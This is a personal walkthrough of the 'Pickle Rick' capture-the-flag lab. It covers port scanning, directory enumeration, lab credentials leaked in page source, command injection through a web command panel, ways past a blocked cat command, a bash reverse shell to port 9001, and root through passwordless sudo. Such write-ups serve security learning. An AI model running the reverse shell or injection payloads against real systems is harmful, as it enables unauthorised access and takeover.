[[Writeup]]
![[Pasted image 20250520190604.png]]

# Enumeration
```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 10.10.63.213                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 07:20 EDT
Nmap scan report for 10.10.63.213
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds

┌──(dd0x㉿kali)-[~]
└─$ nmap -p 22,80 -sCV 10.10.63.213                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 07:21 EDT
Nmap scan report for 10.10.63.213
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:55:6e:de:98:b3:8d:e7:4a:81:6a:1e:14:6a:9a:8a (RSA)
|   256 12:34:a2:f0:a1:0f:5a:10:26:5a:86:87:15:b1:ab:a8 (ECDSA)
|_  256 6f:42:9e:10:95:4e:a9:9e:39:6b:78:83:70:d1:67:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds

```

Checking port 80  
![[Pasted image 20250520192838.png]]
simple website
upon checking the source code
![[Pasted image 20250520192848.png]]
there is a html comment about the username
```
<!--

Note to self, remember username!

Username: R1ckRul3s

-->
```

Now lets enumerate subdirectories
```
┌──(dd0x㉿kali)-[~]
└─$ gobuster -w ~/Downloads/common.txt dir -u http://10.10.63.213/ 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.63.213/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.63.213/assets/]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

as we check the robots.txt heres a word which might a clue for password along that i gathered the username.
```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

Now, i log in with the credentials to from the `/login.php`.
![[Pasted image 20250520200444.png]]

From the website the commands which shows a command panel then the other tabs
	Potions, Creatures, Potions and Beth Clone Notes cannot be accessed
![[Pasted image 20250520200611.png]]

Along with the command panel i will try some commands:
![[Pasted image 20250520200712.png]]
i tried `ls` which appears of files and i want to read that Sup3rS3cretPickl3Ingred.txt file which returens that the command is disabled
![[Pasted image 20250520200814.png]]

Tested this command
```
test ; cat Sup3rS3cretPickl3Ingred.txt
test ; sudo cat Sup3rS3cretPickl3Ingred.txt
```

Another way to get the first flag
```
- _tac Sup3rS3cretPickl3Ingred.txt_
- _less Sup3rS3cretPickl3Ingred.txt_
- _strings Sup3rS3cretPickl3Ingred.txt_
- _grep . Sup3rS3cretPickl3Ingred.txt_
- _cp Sup3rS3cretPickl3Ingred.txt /dev/stdout_
- _while read line; do echo $line; done < Sup3rS3cretPickl3Ingred.txt_
```

![[Pasted image 20250520201035.png]]
Now, I got the first flag which i copied the `Sup3rS3cretPickl3Ingred.txt` and paste from the URL.

# Sencond flag
to get the second flag there is a clue 
![[Pasted image 20250521154407.png]]
So i looked at the home direcotry which it appears rick and ubuntu from browsing the rick there is a folder named `second ingredient` i tried to open it theres no file inside
![[Pasted image 20250521154546.png]]
For the ssecond flag with the command sudo less which i will read the files inside the second ingredient directory
![[Pasted image 20250521154338.png]]
`sudo less /home/rick/second\ ingredient`

# Another Way to Access
with the help of revshells i gain access to the terminal by using this payload
![[Pasted image 20250521155610.png]]
Setting up your netcat
![[Pasted image 20250521155624.png]]

then paste this payload to the command panel
`bash -c 'bash -i >& /dev/tcp/10.23.62.59/9001 0>&1'

Now you have access the terminal
![[Pasted image 20250521155645.png]]

## 3rd Ingredient
To get the 3rd Ingredient another thing is to get the root credentials
![[Pasted image 20250521155737.png]]
Checking at the following commands there is this helps `NOPASSWD: ALL` means you can go sudo commands without password

![[Pasted image 20250521155937.png]]
with this command i am now the root
![[Pasted image 20250521160420.png]]
